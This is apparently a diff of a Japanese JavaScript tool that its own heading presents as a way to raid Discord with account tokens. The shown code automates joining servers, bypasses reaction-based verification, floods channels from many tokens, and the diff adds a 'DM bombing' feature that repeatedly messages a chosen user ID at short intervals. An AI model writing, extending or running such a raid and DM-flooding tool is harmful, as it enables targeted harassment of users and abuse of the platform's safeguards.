@@ -1,9 +1,10 @@
 (function() {
     'use strict';
+    var g_interval_id = [];
     var h = $("<div>").appendTo($("body").css({
         "text-align": "center"
     }));
-    $("<div>",{text:"最終更新：2020/08/09 10:49"}).appendTo(h);
+    $("<div>",{text:"最終更新：2020/08/12 0:16"}).appendTo(h);
     $("<h1>",{text:"Tokenを使って、Discordの荒らしができます。"}).appendTo(h);
     h.append("Tokenの取得の方法は、");
     $("<a>",{
@@ -42,9 +43,9 @@
     });
     var input_time = addInput("リクエスト送信間隔","[秒]").attr({
         type: "number",
-        value: 1,
+        value: 0.5,
         max: 5,
-        min: 0,
+        min: 0.3,
         step: 0.1,
     });
     function makeTime(a, b = 0, len = 0){
@@ -52,10 +53,10 @@
         return (a + b * len) * n * 1000;
     }
     h.append("<br><br><br>");
-    var input_invidedURL = addInput("招待リンク","https://discord.gg/g3Xq7vc");
+    var input_invidedURL = addInput("招待リンク","https://discord.gg/bJ9V3bd");
     addBtn("招待を受ける", enter);
     h.append("<br><br><br>");
-    var input_PUT_URL = addInput("リアクションのRequest URL(認証突破用)","https://discord.com/api/v6/channels/741212688579035216/messages/741215711791415307/reactions/%F0%9F%91%8D/%40me");
+    var input_PUT_URL = addInput("リアクションのRequest URL(認証突破用)","https://discord.com/api/v6/channels/741843145997942826/messages/741846164055523360/reactions/%F0%9F%91%8D/%40me");
     addBtn("PUT(つける)", send_put);
     addBtn("DELETE(外す)", send_delete);
     h.append("<br><br><br>");
@@ -64,16 +65,27 @@
     $("<div>",{text:"リアクション情報はサーバーから抜けた後も保持されています。"}).appendTo(h);
     $("<div>",{text:"再度、サーバーに入って認証を受けるとき、一度リアクションを外す必要があります。"}).appendTo(h);
     h.append("<br><br><br>");
-    var input_url = addTextarea("発言する場所のURLを改行で区切って入力してください。\nhttps://discordapp.com/channels/635695825405607956/635695825405607958");
+    //---------------------------------------------------------------------------------
+    var input_url = addTextarea("発言する場所のURLを改行で区切って入力してください。\nhttps://discord.com/channels/741210331262484531/741845468853829662");
     h.append("<br>");
     addBtn("入力中", typing);
     addBtn("サーバーから脱退", exit);
     h.append("<br><br>");
+    //---------------------------------------------------------------------------------
     var input_saying = addTextarea("発言内容を入力してください。\n空の場合は点呼を取ります。");
     h.append("<br>");
     addBtn("発言", say);
     var random_flag = addBtnToggle("発言内容の語尾にランダムな文字を追加");
-    h.append("<br><br><br>");
+    h.append("<br><br>");
+    //---------------------------------------------------------------------------------
+    var input_userID = addInput("userID", "731744964291330088");
+    var input_saying_dm = addTextarea("DMで送る内容を入力してください。");
+    h.append("<br>");
+    var btn_startDM = addBtn("DM爆撃開始", startDM);
+    var btn_stopDM = addBtn("DM爆撃停止", stopDM).hide();
+    var nowStatus = $("<div>").appendTo(h);
+    h.append("<br><br>");
+    //---------------------------------------------------------------------------------
     //var input_username = addInput("プロフィールの名前");
     //var input_pass = addInput("現在のパスワード");
     // var input_pass_new = addInput("新しいパスワード(省略可)");
@@ -164,7 +176,7 @@
             var url = `https://discordapp.com/api/v6/channels/${room_id}/messages`;
             splitLine(input_token.val()).map(function(v,i){
                 var data = {
-                    content: input_saying.val() || (i+1)+"体目",
+                    content: input_saying.val() || (i+1) + "体目",
                     tts: false
                 };
                 if(random_flag()) data.content += String.fromCharCode(Math.random() * Math.pow(2,16));
@@ -177,6 +189,70 @@
                 },makeTime(o,i,a.length));
             });
         });
+    }
+    // DM
+    function startDM(){
+        btn_startDM.hide();
+        btn_stopDM.show();
+        var userID = input_userID.val();
+        function getIDdm(token, callback){
+            var data = {
+                recipient_id: userID
+            };
+            var xhr = new XMLHttpRequest();
+            xhr.open( 'POST', "https://canary.discordapp.com/api/v6/users/@me/channels" );
+            xhr.setRequestHeader( "authorization", token );
+            xhr.setRequestHeader( "content-type", "application/json" );
+            xhr.onload = function (e) {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    try{
+                        callback(JSON.parse(xhr.responseText).id);
+                    }
+                    catch(err){
+                        console.error("Error token : " + token);
+                    }
+                }
+            };
+            xhr.send(JSON.stringify(data));
+        }
+        nowStatus.text("DMのidを取得中...");
+        var lastTime = makeTime(splitLine(input_token.val()).length),
+            id_list = {};
+        splitLine(input_token.val()).map(function(v,i){
+            g_interval_id.push(setTimeout(function(){
+                getIDdm(v, function(id){
+                    id_list[v] = id;
+                });
+            },makeTime(i)));
+        });
+        function sendDM(token, id){
+            var data = {
+                content: input_saying_dm.val(),
+                tts: false
+            };
+            var xhr = new XMLHttpRequest();
+            xhr.open( 'POST', `https://canary.discordapp.com/api/v6/channels/${id}/messages` );
+            xhr.setRequestHeader( "authorization", token );
+            xhr.setRequestHeader( "content-type", "application/json" );
+            xhr.send(JSON.stringify(data));
+        }
+        g_interval_id.push(setTimeout(function(){
+            nowStatus.text("DM爆撃中...");
+            splitLine(input_token.val()).map(function(v,i,a){
+                g_interval_id.push(setTimeout(function(){
+                    g_interval_id.push(setInterval(function(){
+                        sendDM(v,id_list[v]);
+                    },makeTime(a.length)));
+                },makeTime(i)));
+            });
+        },lastTime));
+    }
+    // stop DM
+    function stopDM(){
+        btn_startDM.show();
+        btn_stopDM.hide();
+        while(g_interval_id.length) clearInterval(g_interval_id.pop());
+        nowStatus.text("DM爆撃を中断しました。");
     }
     var g_avatar;
     // アバターの設定
